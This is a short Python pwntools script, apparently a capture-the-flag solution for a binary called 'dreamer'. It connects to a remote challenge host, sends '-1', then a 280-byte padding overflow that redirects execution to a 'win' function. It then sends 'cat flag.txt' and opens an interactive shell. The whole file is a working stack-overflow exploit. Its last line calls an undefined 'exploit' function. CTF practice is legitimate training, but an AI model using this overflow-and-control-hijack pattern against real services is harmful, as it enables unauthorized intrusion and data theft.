from pwn import *

e = ELF('./dreamer')
r = remote('13.212.97.214', 5013)
rop = b"A"*280
rop += p64(e.symbols["win"])
r.sendline("-1")
r.sendline(rop)
r.sendline('cat flag.txt')
r.interactive()
exploit(r)
